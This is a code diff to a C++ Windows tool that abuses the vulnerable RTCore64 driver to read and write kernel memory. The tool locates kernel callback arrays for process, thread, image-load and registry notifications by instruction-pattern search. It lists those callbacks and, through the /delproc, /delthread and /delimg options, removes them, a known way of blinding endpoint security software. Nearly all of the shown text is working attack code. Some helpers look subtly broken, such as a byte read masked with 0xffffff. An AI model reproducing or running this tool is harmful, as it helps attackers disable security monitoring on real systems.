@@ -44,6 +44,7 @@ static const DWORD RTCORE64_MSR_READ_CODE = 0x80002030;
 static const DWORD RTCORE64_MEMORY_READ_CODE = 0x80002048;
 static const DWORD RTCORE64_MEMORY_WRITE_CODE = 0x8000204c;
 
+
 DWORD ReadMemoryPrimitive(HANDLE Device, DWORD Size, DWORD64 Address) {
     RTCORE64_MEMORY_READ MemoryRead{};
     MemoryRead.Address = Address;
@@ -80,6 +81,10 @@ void WriteMemoryPrimitive(HANDLE Device, DWORD Size, DWORD64 Address, DWORD Valu
         &BytesReturned,
         nullptr);
 }
+BYTE ReadMemoryBYTE(HANDLE Device, DWORD64 Address) {
+    return ReadMemoryPrimitive(Device, 1, Address) & 0xffffff;
+}
+
 
 WORD ReadMemoryWORD(HANDLE Device, DWORD64 Address) {
     return ReadMemoryPrimitive(Device, 2, Address) & 0xffff;
@@ -231,11 +236,7 @@ BOOL service_uninstall(PCWSTR serviceName) {
 }
 // thanks gentilkiwi!
 
-struct Offsets {
-    signed int process;
-    signed int image;
-    signed int thread;
-};
+
 
 void FindDriver(DWORD64 address) {
 
@@ -282,6 +283,13 @@ void FindDriver(DWORD64 address) {
 
 }
 
+struct Offsets {
+    DWORD64 process;
+    DWORD64 image;
+    DWORD64 thread;
+    DWORD64 registry;
+};
+
 struct Offsets getVersionOffsets() {
     wchar_t value[255] = { 0x00 };
     DWORD BufferSize = 255;
@@ -291,9 +299,9 @@ struct Offsets getVersionOffsets() {
     switch (winVer) {
         //case 1903:
     case 1909:
-        return { -0x24D810, -0x24D810, -0x24D3F0};
+        return { 0x8b48cd0349c03345, 0xe8d78b48d90c8d48, 0xe8cd8b48f92c8d48, 0x4024448948f88b48 };
     case 2004:
-        return { 0x563F60, 0x563ED0, 0x563CF0 };
+        return { 0x8b48cd0349c03345, 0xe8d78b48d90c8d48, 0xe8cd8b48f92c8d48, 0x4024448948f88b48 };
     default:
         wprintf(L"[!] Version Offsets Not Found!\n");
 
@@ -324,8 +332,55 @@ DWORD64 GetFunctionAddress(LPCSTR function) {
     DWORD64 address = Ntoskrnlbaseaddress + Offset;
     FreeLibrary(Ntoskrnl);
     Log("[+] %s address: %p", function, address);
-    Log("[+] Kernel base address: %p", Ntoskrnlbaseaddress);
     return address;
+
+}
+
+DWORD64 PatternSearch(HANDLE Device, DWORD64 start, DWORD64 end, DWORD64 pattern) {
+    //searches for a pattern of instructions known to be close to the target array in memory, returns the address. Calling function then does some calculations based on the returned value.
+    int range = end - start;
+
+    for (int i = 0; i < range; i++) {
+        DWORD64 contents = ReadMemoryDWORD64(Device, start + i);
+        if (contents == pattern) {
+            //Log("GOLD JERRY GOLD: %p", start+i);
+            return start + i;
+        }
+    }
+
+}
+
+
+void findregistrycallbackroutines(DWORD64 remove) {
+    //UCHAR PTRN_W10_Reg[] =	{0x48, 0x8b, 0xf8, 0x48, 0x89, 0x44, 0x24, 0x40, 0x48, 0x85, 0xc0, 0x0f, 0x84};
+    //so retrieving this one is different from proc/img/thread. We need to find the undocumented callbacklisthead. The callbacklisthead contains a pointer to the registry notification callback routine. 
+    //At offset 0x28 is the address of the callback function.
+    
+    
+    PLIST_ENTRY pEntry;
+    Offsets offsets = getVersionOffsets();
+    const auto Device = GetDriverHandle();
+    DWORD64 CmUnRegisterCallbackAddress = GetFunctionAddress("CmUnRegisterCallback");
+    DWORD64 DbgkLkmdUnregisterCallbackAddress = GetFunctionAddress("DbgkLkmdUnregisterCallback");
+    DWORD64 patternaddress = PatternSearch(Device, CmUnRegisterCallbackAddress, DbgkLkmdUnregisterCallbackAddress, offsets.registry);
+    DWORD offset = ReadMemoryDWORD(Device, patternaddress - 0x9);
+    const DWORD64 callbacklisthead = (((patternaddress) >> 32) << 32) + ((DWORD)(patternaddress)+offset) - 0x5;
+    Log("[+] Callbacklisthead: %p", callbacklisthead);
+    DWORD64 nextitem = ReadMemoryDWORD64(Device, callbacklisthead + 0x8);
+    int i = 0;
+    
+    while (nextitem != callbacklisthead && i < 64) {
+        nextitem = ReadMemoryDWORD64(Device, nextitem + 0x8);
+        DWORD64 callback = ReadMemoryDWORD64(Device, ReadMemoryDWORD64(Device, nextitem) + 0x28);
+        DWORD64 address = ReadMemoryDWORD64(Device, nextitem) + 0x28;
+        FindDriver(callback);
+        /* Removing this functionality for now. Writing to this structure seems to trigger patchguard. Need to find a way around it.
+        if (callback == remove) {
+            Log("Removing callback to %p at address %p", callback, address);
+            //WriteMemoryDWORD64(Device, address, 0x0000000000000000);
+        }*/
+        i++;
+    }
 
 }
 
@@ -334,9 +389,13 @@ void findimgcallbackroutine(DWORD64 remove) {
     Offsets offsets = getVersionOffsets();
     const auto Device = GetDriverHandle();
     
-    DWORD64 PsSetLoadImageNotifyRoutineAddress = GetFunctionAddress("PsSetLoadImageNotifyRoutine");
+    
+    DWORD64 PsSetLoadImageNotifyRoutineExAddress = GetFunctionAddress("PsSetLoadImageNotifyRoutineEx");
+    DWORD64 PsSetCreateProcessNotifyRoutine = GetFunctionAddress("PsSetCreateProcessNotifyRoutine");
 
-    const DWORD64 PspLoadImageNotifyRoutineAddress = PsSetLoadImageNotifyRoutineAddress + offsets.image;
+    DWORD64 patternaddress = PatternSearch(Device, PsSetLoadImageNotifyRoutineExAddress, PsSetCreateProcessNotifyRoutine, offsets.image);
+    DWORD offset = ReadMemoryDWORD(Device, patternaddress - 0x7);
+    const DWORD64 PspLoadImageNotifyRoutineAddress = (((patternaddress) >> 32) << 32) + ((DWORD)(patternaddress)+offset)-3;
     Log("[+] PspLoadImageNotifyRoutineAddress: %p", PspLoadImageNotifyRoutineAddress);
     Log("[+] Enumerating image load callbacks");
     int i = 0;
@@ -361,9 +420,12 @@ void findthreadcallbackroutine(DWORD64 remove) {
     Offsets offsets = getVersionOffsets();
     const auto Device = GetDriverHandle();
     
-    const DWORD64 PsSetCreateThreadNotifyRoutineAddress = GetFunctionAddress("PsSetCreateThreadNotifyRoutine");
+    const DWORD64 PsRemoveCreateThreadNotifyRoutine = GetFunctionAddress("PsRemoveCreateThreadNotifyRoutine");
+    const DWORD64 PsRemoveLoadImageNotifyRoutine = GetFunctionAddress("PsRemoveLoadImageNotifyRoutine");
     
-    const DWORD64 PspCreateThreadNotifyRoutineAddress = PsSetCreateThreadNotifyRoutineAddress + offsets.thread;
+    DWORD64 patternaddress = PatternSearch(Device, PsRemoveCreateThreadNotifyRoutine, PsRemoveLoadImageNotifyRoutine, offsets.thread);
+    DWORD offset = ReadMemoryDWORD(Device, patternaddress - 0x4);
+    DWORD64 PspCreateThreadNotifyRoutineAddress = (((patternaddress) >> 32) << 32) + ((DWORD)(patternaddress) + offset);
     Log("[+] PspCreateThreadNotifyRoutineAddress: %p", PspCreateThreadNotifyRoutineAddress);
     Log("[+] Enumerating thread creation callbacks");
     int i = 0;
@@ -383,13 +445,20 @@ void findthreadcallbackroutine(DWORD64 remove) {
 
 }
 
+
+
 void findprocesscallbackroutine(DWORD64 remove) {
    
+    //we search the memory between pssetcreateprocessnotifyroutine and iocreatedriver for a specific set of instructions next to a relative LEA containing the offset to the PspCreateProcessNotifyRoutine array of callbacks.
     Offsets offsets = getVersionOffsets();
     const auto Device = GetDriverHandle();
     const DWORD64 PsSetCreateProcessNotifyRoutineAddress = GetFunctionAddress("PsSetCreateProcessNotifyRoutine");
-
-    const DWORD64 PspCreateProcessNotifyRoutineAddress = PsSetCreateProcessNotifyRoutineAddress + offsets.process;
+    const DWORD64 IoCreateDriverAddress = GetFunctionAddress("IoCreateDriver");
+    //the address returned by the patternsearch is just below the offsets. 
+    DWORD64 patternaddress = PatternSearch(Device, PsSetCreateProcessNotifyRoutineAddress, IoCreateDriverAddress, offsets.process);
+    DWORD offset = ReadMemoryDWORD(Device, patternaddress - 0x0c);
+    //so we take the 64 bit address, but have a 32 bit addition. To prevent overflow, we grab the first half (shift right, shift left), then add the 32bit DWORD patternaddress with the 32bit offset, and subtract 8. *cringe*
+    DWORD64 PspCreateProcessNotifyRoutineAddress = (((patternaddress) >> 32) << 32) + ((DWORD)(patternaddress) + offset) - 8;
 
     Log("[+] PspCreateProcessNotifyRoutine: %p", PspCreateProcessNotifyRoutineAddress);
     Log("[+] Enumerating process creation callbacks");
@@ -408,9 +477,6 @@ void findprocesscallbackroutine(DWORD64 remove) {
 
     }
 }
-//TO DO: clean up some stuff and implement functions for some common tasks: 
-
-// getExportedFunction()
 
 
 
@@ -425,7 +491,9 @@ int main(int argc, char* argv[]) {
             " /installDriver - Install the MSI driver\n"
             " /uninstallDriver - Uninstall the MSI driver\n"
             " /img - List Image Load Callbacks\n"
-            " /delimg <address> - Remove Image Load Callback", argv[0]);
+            " /delimg <address> - Remove Image Load Callback\n"
+            " /reg - List Registry modification callbacks\n"
+            , argv[0]);
         return 0;
     }
     
@@ -440,8 +508,7 @@ int main(int argc, char* argv[]) {
 
     if (strcmp(argv[1] + 1, "proc") == 0) {
 
-        DWORD64 remove = NULL;
-        findprocesscallbackroutine(remove);
+        findprocesscallbackroutine(NULL);
     }
     else if (strcmp(argv[1] + 1, "delproc") == 0 && argc == 3) {
         DWORD64 remove;
@@ -457,12 +524,12 @@ int main(int argc, char* argv[]) {
         service_uninstall(svcName);
     }
     else if (strcmp(argv[1] + 1, "img") == 0) {
-        DWORD64 remove = NULL;
-        findimgcallbackroutine(remove);
+        
+        findimgcallbackroutine(NULL);
     }
     else if (strcmp(argv[1] + 1, "thread") == 0) {
-        DWORD64 remove = NULL;
-        findthreadcallbackroutine(remove);
+        
+        findthreadcallbackroutine(NULL);
     }
     else if (strcmp(argv[1] + 1, "delthread") == 0 && argc == 3) {
         DWORD64 remove;
@@ -473,6 +540,10 @@ int main(int argc, char* argv[]) {
         DWORD64 remove;
         remove = strtoull(argv[2], NULL, 16);
         findimgcallbackroutine((DWORD64)remove);
+    }
+    else if (strcmp(argv[1] + 1, "reg") == 0) {
+        
+        findregistrycallbackroutines(NULL);
     }
     else {
         wprintf(L"Error: Check the help\n");
